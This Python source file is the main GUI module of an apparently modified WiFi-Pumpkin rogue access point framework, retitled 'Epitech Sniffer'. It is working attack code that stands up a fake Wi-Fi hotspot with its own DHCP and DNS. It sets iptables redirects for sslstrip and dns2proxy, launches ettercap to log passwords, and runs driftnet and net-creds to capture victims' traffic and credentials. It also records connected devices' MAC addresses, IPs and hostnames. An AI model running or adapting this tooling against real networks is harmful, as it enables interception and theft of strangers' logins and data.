from sys import argv

from re import search
from shutil import move
from time import asctime
from ast import literal_eval

from os import system, path, chdir, popen, listdir, mkdir
from subprocess import Popen, PIPE, STDOUT, call, check_output, CalledProcessError
from isc_dhcp_leases.iscdhcpleases import IscDhcpLeases
from Core.intGUI import *
from Core.Utils import ProcessThread, Refactor, setup_logger, set_monitor_mode, ProcessHostapd

from Core.config.Settings import frm_Settings
from Core.helpers.about import frmAbout
from Core.ThRunDhcp import ThRunDhcp
from Core.Threadsslstrip import Threadsslstrip


if search('/usr/share/', argv[0]): chdir('/usr/share/WiFi-Pumpkin/')

author = ' P0cl4bs Team [mh4root | S4mb3ck | 7h3-m4ux | M4wu3n4]'
emails = ['mh4root@gmail.com', 'p0cl4bs@gmail.com', 'dthe-maux@hotmail.fr']
license = ' GNU GPL 3'
update = '29/12/2015'
desc = ['Framework for Rogue Wi-Fi Access Point Attacks']


class Initialize(QMainWindow):
    def __init__(self, parent=None):
        super(Initialize, self).__init__(parent)
        self.form_widget = SubMain(self)
        self.FSettings = frm_Settings()
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle('Epitech Sniffer' + "0.1v")
        self.loadtheme(self.FSettings.XmlThemeSelected())

    def loadtheme(self, theme):
        sshFile = ("Core/%s.qss" % (theme))
        with open(sshFile, "r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        framegm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        framegm.moveCenter(centerPoint)
        self.move(framegm.topLeft())

    def closeEvent(self, event):
        outputiwconfig = popen('iwconfig').readlines()
        for i in outputiwconfig:
            if search('Mode:Monitor', i):
                reply = QMessageBox.question(self, 'About Exit', 'Are you sure to quit?',
                                             QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
                if reply == QMessageBox.Yes:
                    event.accept()
                    set_monitor_mode(i.split()[0]).setDisable()
                    return
                event.ignore()

class PopUpPlugins(QWidget):
    def __init__(self, FSettings):
        QWidget.__init__(self)
        self.FSettings = FSettings
        self.layout = QVBoxLayout(self)
        self.title = QLabel('::Available Plugins::')
        self.check_sslstrip = QCheckBox('::ssLstrip')
        self.check_netcreds = QCheckBox('::net-creds')
        self.check_dns2proy = QCheckBox('::dns2proxy')
        self.check_dns2proy.clicked.connect(self.checkBoxDns2proxy)
        self.check_sslstrip.clicked.connect(self.checkBoxSslstrip)
        self.check_netcreds.clicked.connect(self.checkBoxNecreds)
        self.layout.addWidget(self.title)
        self.layout.addWidget(self.check_sslstrip)
        self.layout.addWidget(self.check_netcreds)
        self.layout.addWidget(self.check_dns2proy)

    # control checkbox plugins
    def checkBoxSslstrip(self):
        if not self.check_sslstrip.isChecked():
            self.unset_Rules('sslstrip')
            self.FSettings.xmlSettings('sslstrip_plugin', 'status', 'False', False)
        elif self.check_sslstrip.isChecked():
            self.set_sslStripRule()
            self.FSettings.xmlSettings('sslstrip_plugin', 'status', 'True', False)

    def checkBoxDns2proxy(self):
        if not self.check_dns2proy.isChecked():
            self.unset_Rules('dns2proxy')
            self.FSettings.xmlSettings('dns2proxy_plugin', 'status', 'False', False)
        elif self.check_dns2proy.isChecked():
            self.set_Dns2proxyRule()
            self.FSettings.xmlSettings('dns2proxy_plugin', 'status', 'True', False)

    def checkBoxNecreds(self):
        if self.check_netcreds.isChecked():
            self.FSettings.xmlSettings('netcreds_plugin', 'status', 'True', False)
        else:
            self.FSettings.xmlSettings('netcreds_plugin', 'status', 'False', False)

    # set rules to sslstrip
    def set_sslStripRule(self):
        item = QListWidgetItem()
        item.setText('iptables -t nat -A PREROUTING -p ' +
                     'tcp --destination-port 80 -j REDIRECT --to-port ' + self.FSettings.redirectport.text())
        item.setSizeHint(QSize(30, 30))
        self.FSettings.ListRules.addItem(item)

    # set redirect port rules dns2proy
    def set_Dns2proxyRule(self):
        item = QListWidgetItem()
        item.setText('iptables -t nat -A PREROUTING -p ' +
                     'udp --destination-port 53 -j REDIRECT --to-port 53')
        item.setSizeHint(QSize(30, 30))
        self.FSettings.ListRules.addItem(item)

    def unset_Rules(self, type):
        items = []
        for index in xrange(self.FSettings.ListRules.count()):
            items.append(str(self.FSettings.ListRules.item(index).text()))
        for i, j in enumerate(items):
            if type == 'sslstrip':
                if search(str('tcp --destination-port 80 -j REDIRECT --to-port ' +
                                      self.FSettings.redirectport.text()), j):
                    self.FSettings.ListRules.takeItem(i)
            elif type == 'dns2proxy':
                if search('udp --destination-port 53 -j REDIRECT --to-port 53', j):
                    self.FSettings.ListRules.takeItem(i)


class SubMain(QWidget):
    def __init__(self, parent=None):
        super(SubMain, self).__init__(parent)
        self.myLogProbeScan = open("./LogProbeScan", 'a')
        # self.create_sys_tray()
        self.Main = QVBoxLayout()
        self.Apthreads = {'RougeAP': []}
        self.APclients = {}
        self.ConfigTwin = {
            'ProgCheck': [], 'AP_iface': None,
            'PortRedirect': None, 'interface': 'None'}
        self.THeaders = {'ip-address': [], 'device': [], 'mac-address': []}
        self.FSettings = frm_Settings()
        self.PopUpPlugins = PopUpPlugins(self.FSettings)
        self.setGeometry(0, 0, 300, 400)
        self.checkPlugins()
        intGUI(self)

    def checkPlugins(self):
        if literal_eval(self.FSettings.xmlSettings('sslstrip_plugin', 'status', None, False)):
            self.PopUpPlugins.check_sslstrip.setChecked(True)
            self.PopUpPlugins.set_sslStripRule()
        if literal_eval(self.FSettings.xmlSettings('netcreds_plugin', 'status', None, False)):
            self.PopUpPlugins.check_netcreds.setChecked(True)
        if literal_eval(self.FSettings.xmlSettings('dns2proxy_plugin', 'status', None, False)):
            self.PopUpPlugins.check_dns2proy.setChecked(True)
            self.PopUpPlugins.set_Dns2proxyRule()

    def Started(self, bool):
        if bool:
            self.StatusDhcp.setText("[ON]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : green; }")
        else:
            self.StatusDhcp.setText("[OFF]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : red; }")

    def StatusDHCPRequests(self, key):
        print('Connected::[{}] hostname::[{}]'.format(key, self.APclients[key]['device']))

    def GetDHCPRequests(self, data):
        print "in GetDHCPRequests"
        if len(data) == 8:
            if Refactor.check_is_mac(data[4]):
                if data[4] not in self.APclients.keys():
                    self.myLogProbeScan.write("TargetConnection#%s*%s;%s\n" % (data[2], data[5], data[4]));
                    self.myLogProbeScan.flush();
                    self.APclients[data[4]] = {'IP': data[2], 'device': data[5],
                                               'in_tables': False,}
                    self.StatusDHCPRequests(data[4])
        elif len(data) == 9:
            if Refactor.check_is_mac(data[5]):
                if data[5] not in self.APclients.keys():
                    self.myLogProbeScan.write("TargetConnection#%s*%s;%s\n" % (data[2], data[6], data[5]));
                    self.myLogProbeScan.flush();
                    self.APclients[data[5]] = {'IP': data[2], 'device': data[6],
                                               'in_tables': False,}
                    self.StatusDHCPRequests(data[5])
        elif len(data) == 7:
            if Refactor.check_is_mac(data[4]):
                if data[4] not in self.APclients.keys():
                    leases = IscDhcpLeases('Settings/dhcp/dhcpd.leases')
                    hostname = None
                    try:
                        for item in leases.get():
                            if item.ethernet == data[4]:
                                hostname = item.hostname
                        if hostname == None:
                            item = leases.get_current()
                            hostname = item[data[4]]
                    except:
                        hostname = 'unknown'
                    if hostname == None: hostname = 'unknown'
                    self.APclients[data[4]] = {'IP': data[2], 'device': hostname,
                                               'in_tables': False,}
                    self.StatusDHCPRequests(data[4])
                    self.APclients[data[4]] = {'IP': data[2], 'device': hostname, 'in_tables': False,}
        Headers = []
        for mac in self.APclients.keys():
            if self.APclients[mac]['in_tables'] == False:
                self.APclients[mac]['in_tables'] = True
                self.THeaders['mac-address'].append(mac)
                self.THeaders['ip-address'].append(self.APclients[mac]['IP'])
                self.THeaders['device'].append(self.APclients[mac]['device'])
                for n, key in enumerate(self.THeaders.keys()):
                    Headers.append(key)
                    for m, item in enumerate(self.THeaders[key]):
                        item = QTableWidgetItem(item)
                        item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                        self.TabInfoAP.setItem(m, n, item)
                self.TabInfoAP.setHorizontalHeaderLabels(self.THeaders.keys())
        self.connectedCount.setText(str(len(self.APclients.keys())))

    def GetHostapdStatus(self, data):
        if self.APclients != {}:
            if data in self.APclients.keys():
                print('Disconnected::[{}] hostname::[{}]'.format(data, self.APclients[data]['device']))
        for row in xrange(0, self.TabInfoAP.rowCount()):
            if self.TabInfoAP.item(row, 1) != None:
                if self.TabInfoAP.item(row, 1).text() == data:
                    self.TabInfoAP.removeRow(row)
                    if data in self.APclients.keys():
                        del self.APclients[data]
        for mac_tables in self.APclients.keys(): self.APclients[mac_tables]['in_tables'] = False
        self.THeaders = {'ip-address': [], 'device': [], 'mac-address': []}
        self.connectedCount.setText(str(len(self.APclients.keys())))

    def mConfigure(self):
        self.get_interfaces = Refactor.get_interfaces()
        try:
            self.EditGateway.setText(
                [self.get_interfaces[x] for x in self.get_interfaces.keys() if x == 'gateway'][0])
        except:
            pass
        self.EditApName.setText(self.FSettings.xmlSettings('AP', 'name', None, False))
        self.EditChannel.setText(self.FSettings.xmlSettings('channel', 'mchannel', None, False))
        self.ConfigTwin['PortRedirect'] = self.FSettings.redirectport.text()
        for i, j in enumerate(self.get_interfaces['all']):
            if search('wlan', j): self.selectCard.addItem(self.get_interfaces['all'][i])
        driftnet = popen('which driftnet').read().split('\n')
        ettercap = popen('which ettercap').read().split('\n')
        dhcpd = popen('which dhcpd').read().split("\n")
        dnsmasq = popen('which dnsmasq').read().split("\n")
        hostapd = popen('which hostapd').read().split("\n")
        lista = ['/usr/sbin/airbase-ng', ettercap[0], driftnet[0], dhcpd[0], dnsmasq[0], hostapd[0]]
        for i in lista: self.ConfigTwin['ProgCheck'].append(path.isfile(i))

    def exportHTML(self):
        contents = Refactor.exportHtml()
        filename = QFileDialog.getSaveFileNameAndFilter(self,
                                                        'Save File Logger HTML', 'report.html', 'HTML (*.html)')
        if len(filename) != 0:
            with open(str(filename[0]), 'w') as filehtml:
                filehtml.write(contents['HTML']), filehtml.close()
            QMessageBox.information(self, 'WiFi Pumpkin', 'file has been saved with success.')

    def refrash_interface(self):
        self.selectCard.clear()
        n = Refactor.get_interfaces()['all']
        for i, j in enumerate(n):
            if search('wlan', j):
                self.selectCard.addItem(n[i])

    def kill(self):
        if self.Apthreads['RougeAP'] == []: return
        self.FSettings.xmlSettings('statusAP', 'value', 'False', False)
        for i in self.Apthreads['RougeAP']: i.stop()
        for kill in self.SettingsAP['kill']: popen(kill)
        set_monitor_mode(self.ConfigTwin['interface']).setDisable()
        self.Started(False)
        self.Apthreads['RougeAP'] = []
        self.APclients = {}
        with open('Settings/dhcp/dhcpd.leases', 'w') as dhcpLease:
            dhcpLease.write(''), dhcpLease.close()
        self.btn_start_attack.setDisabled(False)
        Refactor.set_ip_forward(0)
        self.TabInfoAP.clearContents()
        try:
            self.FormPopup.Ftemplates.killThread()
            self.FormPopup.StatusServer(False)
        except AttributeError as e:
            print e

    def delete_logger(self):
        content = Refactor.exportHtml()
        if listdir('Logs') != '':
            resp = QMessageBox.question(self, 'About Delete Logger',
                                        'do you want to delete Logs?', QMessageBox.Yes |
                                        QMessageBox.No, QMessageBox.No)
            if resp == QMessageBox.Yes:
                system('rm Logs/Caplog/*.cap')
                for keyFile in content['Files']:
                    with open(keyFile, 'w') as f:
                        f.write(''), f.close()

    def start_etter(self):
        if self.ConfigTwin['ProgCheck'][1]:
            if search(str(self.ConfigTwin['AP_iface']), str(popen('ifconfig').read())):
                Thread_Ettercap = ProcessThread(['sudo', 'xterm', '-geometry', '73x25-1+50',
                                                 '-T', 'ettercap', '-s', '-sb', '-si', '+sk', '-sl',
                                                 '5000', '-e', 'ettercap', '-p', '-u', '-T', '-q', '-w',
                                                 'Logs/passwords', '-i', self.ConfigTwin['AP_iface']])
                Thread_Ettercap.setName('Tool::Ettercap')
                self.Apthreads['RougeAP'].append(Thread_Ettercap)
                Thread_Ettercap.start()
            return
        QMessageBox.information(self, 'ettercap', 'ettercap not found.')

    def start_dift(self):
        if self.ConfigTwin['ProgCheck'][2]:
            if search(str(self.ConfigTwin['AP_iface']), str(popen('ifconfig').read())):
                Thread_driftnet = ProcessThread(['sudo', 'xterm', '-geometry', '75x15+1+200',
                                                 '-T', 'DriftNet', '-e', 'driftnet', '-i', self.ConfigTwin['AP_iface']])
                Thread_driftnet.setName('Tool::Driftnet')
                self.Apthreads['RougeAP'].append(Thread_driftnet)
                Thread_driftnet.start()
            return
        QMessageBox.information(self, 'driftnet', 'driftnet not found.')

    def CoreSettings(self):
        range_dhcp = self.FSettings.xmlSettings('Iprange', 'range', None, False)
        self.ConfigTwin['PortRedirect'] = self.FSettings.xmlSettings('redirect', 'port', None, False)
        self.SettingsAP = {
            'interface':
                [
                    'ifconfig %s up' % (self.ConfigTwin['AP_iface']),
                    'ifconfig %s 10.0.0.1 netmask 255.255.255.0' % (self.ConfigTwin['AP_iface']),
                    'ifconfig %s mtu 1400' % (self.ConfigTwin['AP_iface']),
                    'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
                ],
            'kill':
                [
                    'iptables --flush',
                    'iptables --table nat --flush',
                    'iptables --delete-chain',
                    'iptables --table nat --delete-chain',
                    'ifconfig %s 0' % (self.ConfigTwin['AP_iface']),
                    'killall dhpcd',
                    'killall dnsmasq'
                ],
            'hostapd':
                [
                    'interface={}\n'.format(str(self.selectCard.currentText())),
                    'ssid={}\n'.format(str(self.EditApName.text())),
                    'channel={}\n'.format(str(self.EditChannel.text())),
                ],
            'dhcp-server':
                [
                    'authoritative;\n',
                    'default-lease-time 600;\n',
                    'max-lease-time 7200;\n',
                    'subnet 10.0.0.0 netmask 255.255.255.0 {\n',
                    'option routers 10.0.0.1;\n',
                    'option subnet-mask 255.255.255.0;\n',
                    'option domain-name \"%s\";\n' % (str(self.EditApName.text())),
                    'option domain-name-servers 10.0.0.1;\n',
                    'range %s;\n' % range_dhcp,
                    '}',
                ],
            'dnsmasq':
                [
                    'interface=%s\n' % (self.ConfigTwin['AP_iface']),
                    'dhcp-range=10.0.0.1,10.0.0.50,12h\n',
                    'dhcp-option=3, 10.0.0.1\n',
                    'dhcp-option=6, 10.0.0.1\n',
                ]
        }
        Refactor.set_ip_forward(1)
        for i in self.SettingsAP['kill']: popen(i)
        for i in self.SettingsAP['interface']: popen(i)
        dhcp_select = self.FSettings.xmlSettings('dhcp', 'dhcp_server', None, False)
        if dhcp_select != 'dnsmasq':
            with open('Settings/dhcpd.conf', 'w') as dhcp:
                for i in self.SettingsAP['dhcp-server']: dhcp.write(i)
                dhcp.close()
                if path.isfile('/etc/dhcp/dhcpd.conf'):
                    system('rm -f /etc/dhcp/dhcpd.conf')
                if not path.isdir('/etc/dhcp/'): mkdir('/etc/dhcp')
                move('Settings/dhcpd.conf', '/etc/dhcp/')
        else:
            with open('Core/config/dnsmasq.conf', 'w') as dhcp:
                for i in self.SettingsAP['dnsmasq']:
                    dhcp.write(i)
                dhcp.close()

    def StartApFake(self):
        if len(self.selectCard.currentText()) == 0:
            return QMessageBox.warning(self, 'Error interface', 'Network interface not supported :(')
        if len(self.EditGateway.text()) == 0:
            return QMessageBox.warning(self, 'Error Gateway', 'gateway not found')
        if not self.ConfigTwin['ProgCheck'][5]:
            return QMessageBox.information(self, 'Error Hostapd', 'hostapd not installed')
        dhcp_select = self.FSettings.xmlSettings('dhcp', 'dhcp_server', None, False)
        if dhcp_select == 'iscdhcpserver':
            if not self.ConfigTwin['ProgCheck'][3]:
                return QMessageBox.warning(self, 'Error dhcp', 'isc-dhcp-server not installed')
        elif dhcp_select == 'dnsmasq':
            if not self.ConfigTwin['ProgCheck'][4]:
                return QMessageBox.information(self, 'Error dhcp', 'dnsmasq not installed')
        if str(Refactor.get_interfaces()['activated']).startswith('wlan'):
            return QMessageBox.information(self, 'Error network card',
                                           'You are connected with interface wireless, try again with local connection')
        self.btn_start_attack.setDisabled(True)
        self.APactived = self.FSettings.xmlSettings('accesspoint', 'actived', None, False)
        if self.APactived == 'airbase-ng':
            self.ConfigTwin['interface'] = str(set_monitor_mode(self.selectCard.currentText()).setEnable())
            self.FSettings.xmlSettings('interface', 'monitor_mode', self.ConfigTwin['interface'], False)
            # airbase thread
            Thread_airbase = ProcessThread(['airbase-ng',
                                            '-c', str(self.EditChannel.text()), '-e', self.EditApName.text(),
                                            '-F', 'Logs/Caplog/' + asctime(), self.ConfigTwin['interface']])
            Thread_airbase.name = 'Airbase-ng'
            self.Apthreads['RougeAP'].append(Thread_airbase)
            Thread_airbase.start()
            # settings
            while True:
                if Thread_airbase.iface != None:
                    self.ConfigTwin['AP_iface'] = [x for x in Refactor.get_interfaces()['all'] if search('at', x)][0]
                    self.FSettings.xmlSettings('netcreds', 'interface', self.ConfigTwin['AP_iface'], False)
                    break
            self.CoreSettings()
        elif self.APactived == 'hostapd':
            self.FSettings.xmlSettings('netcreds', 'interface',
                                       str(self.selectCard.currentText()), False)
            self.ConfigTwin['AP_iface'] = str(self.selectCard.currentText())
            try:
                check_output(['nmcli', 'radio', 'wifi', "off"])
            except CalledProcessError:
                try:
                    check_output(['nmcli', 'nm', 'wifi', "off"])
                except CalledProcessError as e:
                    return QMessageBox.warning(self, 'Error nmcli', e)
            call(['rfkill', 'unblock', 'wlan'])
            self.CoreSettings()
            ignore = ('interface=', 'ssid=', 'channel=')
            with open('Settings/hostapd.conf', 'w') as apconf:
                for i in self.SettingsAP['hostapd']: apconf.write(i)
                for config in str(self.FSettings.ListHostapd.toPlainText()).split('\n'):
                    if not config.startswith('#') and len(config) > 0:
                        if not config.startswith(ignore):
                            apconf.write(config + '\n')
                apconf.close()
            self.Thread_hostapd = ProcessHostapd(['hostapd', '-d', 'Settings/hostapd.conf'])
            self.Thread_hostapd.setObjectName('hostapd')
            self.Thread_hostapd.statusAP_connected.connect(self.GetHostapdStatus)
            self.Apthreads['RougeAP'].append(self.Thread_hostapd)
            self.Thread_hostapd.start()

        # thread dhcp
        selected_dhcp = self.FSettings.xmlSettings('dhcp', 'dhcp_server', None, False)
        if selected_dhcp == 'iscdhcpserver':
            Thread_dhcp = ThRunDhcp(
                ['sudo', 'dhcpd', '-d', '-f', '-lf', 'Settings/dhcp/dhcpd.leases', '-cf', '/etc/dhcp/dhcpd.conf',
                 self.ConfigTwin['AP_iface']])
            Thread_dhcp.sendRequest.connect(self.GetDHCPRequests)
            Thread_dhcp.setObjectName('DHCP')
            self.Apthreads['RougeAP'].append(Thread_dhcp)
            Thread_dhcp.start()

        ##### dnsmasq disabled
        # elif selected_dhcp == 'dnsmasq':
        #     Thread_dhcp = ThRunDhcp(['dnsmasq','-C','Core/config/dnsmasq.conf','-d'])
        #     self.connect(Thread_dhcp ,SIGNAL('Activated ( QString ) '), self.dhcpLog)
        #     Thread_dhcp .setObjectName('DHCP')
        #     self.Apthreads['RougeAP'].append(Thread_dhcp)
        #     Thread_dhcp .start()
        else:
            return QMessageBox.information(self, 'DHCP', selected_dhcp + ' not found.')
        self.Started(True)
        self.FSettings.xmlSettings('statusAP', 'value', 'True', False)

        if self.FSettings.check_redirect.isChecked() or not self.PopUpPlugins.check_sslstrip.isChecked():
            popen('iptables -t nat -A PREROUTING -p udp -j DNAT --to {}'.format(str(self.EditGateway.text())))
            self.FSettings.xmlSettings('sslstrip_plugin', 'status', 'False', False)
            self.PopUpPlugins.check_sslstrip.setChecked(False)
            self.PopUpPlugins.unset_Rules('sslstrip')

        # thread plugins
        if self.PopUpPlugins.check_sslstrip.isChecked():
            Thread_sslstrip = Threadsslstrip(self.ConfigTwin['PortRedirect'])
            Thread_sslstrip.setObjectName("sslstrip")
            self.Apthreads['RougeAP'].append(Thread_sslstrip)
            Thread_sslstrip.start()

        if self.PopUpPlugins.check_netcreds.isChecked():
            Thread_netcreds = ProcessThread(['python', 'Plugins/net-creds/net-creds.py', '-i',
                                             self.FSettings.xmlSettings('netcreds', 'interface', None, False)])
            Thread_netcreds.setName('Net-Creds')
            self.Apthreads['RougeAP'].append(Thread_netcreds)
            Thread_netcreds.start()

        if self.PopUpPlugins.check_dns2proy.isChecked():
            Thread_dns2proxy = ProcessThread(['python', 'Plugins/dns2proxy/dns2proxy.py'])
            Thread_dns2proxy.setName('Dns2Proxy')
            self.Apthreads['RougeAP'].append(Thread_dns2proxy)
            Thread_dns2proxy.start()

        iptables = []
        for index in xrange(self.FSettings.ListRules.count()):
            iptables.append(str(self.FSettings.ListRules.item(index).text()))
        for rules in iptables:
            if search('--append FORWARD --in-interface',
                      rules):
                popen(rules.replace('$$', self.ConfigTwin['AP_iface']))
            elif search('--append POSTROUTING --out-interface', rules):
                popen(rules.replace('$$', str(Refactor.get_interfaces()['activated'])))
            else:
                popen(rules)

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('rsc/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray, SIGNAL('activated(QSystemTrayIcon::ActivationReason)'),
                     self.on_sys_tray_activated)
        self.sysTrayMenu = QMenu(self)
        self.sysTrayMenu.addAction('FOO')

    def on_sys_tray_activated(self, reason):
        if reason == 3:
            self.showNormal()
        elif reason == 2:
            self.showMinimized()

    def about(self):
        self.Fabout = frmAbout(author, emails, "0.1v", update, license, desc)
        self.Fabout.show()

    def issue(self):
        url = QUrl('https://github.com/P0cL4bs/WiFi-Pumpkin/issues/new')
        if not QDesktopServices.openUrl(url):
            QMessageBox.warning(self, 'Open Url', 'Could not open url')
